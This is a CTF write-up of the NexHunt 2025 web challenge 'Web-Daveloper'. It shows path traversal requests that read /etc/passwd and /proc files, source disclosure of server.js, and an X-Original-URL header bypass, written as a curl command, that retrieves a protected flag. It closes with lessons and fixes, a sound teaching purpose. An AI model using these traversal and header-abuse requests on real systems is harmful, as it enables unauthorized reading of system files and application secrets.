---
title: "NexHunt: Writeup for Web/Web-Daveloper"
published: 2025-12-13
description: A detailed walkthrough of a web CTF challenge involving LFI
tags: [CTF, Web Security, LFI]
category: Writeups
author: 0xuserm9
---

# Challenge Overview

* CTF: NexHunt CTF 2025
* Challenge: Web-Daveloper
* Category: Web Exploitation
* Points: 100 (28 solves)
>Description: 
i am just a web daveloper, using copilot and chatgbt to create challenges :
>i dont know where is flag.txt , can u find it for me !!!
NOTE: brute forcing is not allowed, you'll be blocked immediatly
Connection Info : http://ctf.nexus-security.club:3555/

>Author: 0xsila X dhia

![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/1.PNG)

---

## Step 1 — Local File Inclusion (LFI)

Testing for path traversal:

```http
GET /../../../etc/passwd HTTP/1.1
Host: target
```

The server returned `/etc/passwd`, confirming **LFI**.

---

## Step 2 — Identify the Running User

From `/etc/passwd`:

```
node:x:1000:1000::/home/node:/bin/sh
```

This confirms:
- Backend runs as `node`
- Application is likely **Node.js**

---

## Step 3 — procfs Enumeration

Using LFI on `/proc/self/cmdline`:

```http
GET /../../../proc/self/cmdline HTTP/1.1
Host: target
```

Response:

```
node nodeserver.js
```

This shows the app was started as:

```
node nodeserver.js
```

---

## Step 4 — Application Path Leak

Trying to read `/proc/self/cwd` caused an error, leaking a stack trace:

```
Error: EISDIR: illegal operation on a directory, read
at /app/server.js:114:28
```

From this we learn:
- Application directory: `/app`
- Main file: `/app/server.js`

---

## Step 5 — Source Code Disclosure

Using LFI:

```http
GET /../../../app/server.js HTTP/1.1
Host: target
```

Important code found:

```js
const BASE = path.join(__dirname, "data");
const PUBLIC_DIR = path.join(BASE, "public");
const PRIVATE_DIR = path.join(BASE, "vault");
```

Directory structure:

```
/app/data/public
/app/data/vault
```

Access to the vault is blocked:

```js
if (target.startsWith(PRIVATE_DIR)) {
  return res.status(403).send("Forbidden");
}
```

---

## Step 6 — Logic Flaw (Trusted Header Abuse)

Another code path:

```js
const overrideUrl = req.header("X-Original-URL");

if (overrideUrl) {
  const realTarget = path.join(BASE, overrideUrl);
  if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
    return res.send(fs.readFileSync(realTarget, "utf8"));
  }
}
```

### Vulnerability
- No validation against `PRIVATE_DIR`
- Blind trust in `X-Original-URL`
- Security check is bypassed

---

## Step 7 — Retrieve the Flag

By sending a safe path and abusing the header:

```http
GET / HTTP/1.1
Host: target
X-Original-URL: /vault/flag.txt
```

Or using curl:

```bash
curl -H "X-Original-URL: /vault/flag.txt" http://target/
```

🎉 The flag is returned.

---

## Lessons Learned

- LFI is often only the entry point
- `/proc` is powerful for reconnaissance
- Stack traces leak sensitive paths
- Never trust headers like `X-Original-URL`
- Security checks must be consistent

---

## How to Fix

- Normalize and validate all file paths
- Apply access control on every read path
- Disable stack traces in production
- Do not trust proxy headers blindly

---

## Conclusion

This challenge demonstrates how chaining small vulnerabilities can lead to full compromise.  
No brute force, no fuzzing — only logic.

Happy hacking 🏴‍☠️
